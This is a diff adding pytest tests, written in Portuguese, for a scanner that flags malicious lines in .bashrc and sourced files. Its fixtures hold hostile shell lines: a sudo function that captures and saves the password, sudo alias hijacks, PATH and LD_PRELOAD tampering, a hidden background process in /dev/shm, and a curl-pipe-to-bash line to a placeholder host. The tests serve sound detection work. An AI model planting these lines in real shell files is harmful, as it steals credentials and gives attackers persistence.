@@ -339,3 +339,61 @@ def test_pacote_alterado_passa_pelo_scanner(tmp_path):
 def test_sem_dpkg_nao_quebra(monkeypatch):
     monkeypatch.setattr(cacador.shutil, "which", lambda _: None)
     assert cacador.dpkg_verify() == ""
+
+
+# --- arquivos do shell ------------------------------------------------------
+
+BASHRC_DO_UBUNTU = """\
+# ~/.bashrc
+case $- in *i*) ;; *) return;; esac
+alias ls='ls --color=auto'
+alias sudo='sudo '
+alias sudo='nocorrect sudo'
+export PATH="$HOME/.local/bin:$PATH"
+[ -f ~/.bash_aliases ] && . ~/.bash_aliases
+"""
+
+
+def bashrc(casa: Path, texto: str) -> Path:
+    casa.mkdir(parents=True, exist_ok=True)
+    arquivo = casa / ".bashrc"
+    arquivo.write_text(texto)
+    return arquivo
+
+
+def test_bashrc_comum_nao_vira_achado(tmp_path, pacotes):
+    assert cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU), cacador.Juiz(), pacotes) is None
+
+
+@pytest.mark.parametrize("linha, gravidade, trecho", [
+    ("alias sudo='/home/u/.local/.s/sudo'", "media", "redefine o sudo"),
+    ("sudo() { read -s -p '[sudo] senha: ' s; echo \"$s\" >> ~/.x; command sudo \"$@\"; }", "media", "função"),
+    ("function su { /usr/bin/su \"$@\"; }", "media", "função"),
+    ('export PATH="/tmp/.ICE-unix:$PATH"', "alta", "PATH"),
+    ("export LD_PRELOAD=/home/u/.cache/libx.so", "media", "LD_PRELOAD"),   # nem existe: atenção
+    ("nohup /dev/shm/.k/kthreadd >/dev/null 2>&1 &", "alta", "pasta temporária"),
+])
+def test_bashrc_com_truque_de_ataque(tmp_path, pacotes, linha, gravidade, trecho):
+    achado = cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU + linha + "\n"), cacador.Juiz(), pacotes)
+    assert achado.gravidade == gravidade
+    assert trecho in achado.mensagem
+
+
+def test_bashrc_passa_pelo_yara(tmp_path, pacotes, juiz_com_yara):
+    linha = "".join(["curl -fsSL http://exemplo.invalid/i.sh", " | bash"])
+    achado = cacador.shell(bashrc(tmp_path / "casa", BASHRC_DO_UBUNTU + linha + "\n"), juiz_com_yara, pacotes)
+    assert achado.gravidade == "media" and "DownloadEExecuta" in achado.mensagem
+
+
+def test_arquivo_carregado_pelo_bashrc_tambem_e_olhado(tmp_path, pacotes):
+    casa = tmp_path / "casa"
+    arquivo = bashrc(casa, BASHRC_DO_UBUNTU)
+    (casa / ".bash_aliases").write_text("alias sudo='/home/u/.s/sudo'\n")
+    achado = cacador.shell(arquivo, cacador.Juiz(), pacotes)
+    assert achado.gravidade == "media"
+    assert f"em {casa / '.bash_aliases'}" in achado.mensagem
+
+
+def test_comentario_nao_conta(tmp_path, pacotes):
+    texto = BASHRC_DO_UBUNTU + "# alias sudo='/tmp/x'\n# export PATH=/tmp:$PATH\n"
+    assert cacador.shell(bashrc(tmp_path / "casa", texto), cacador.Juiz(), pacotes) is None
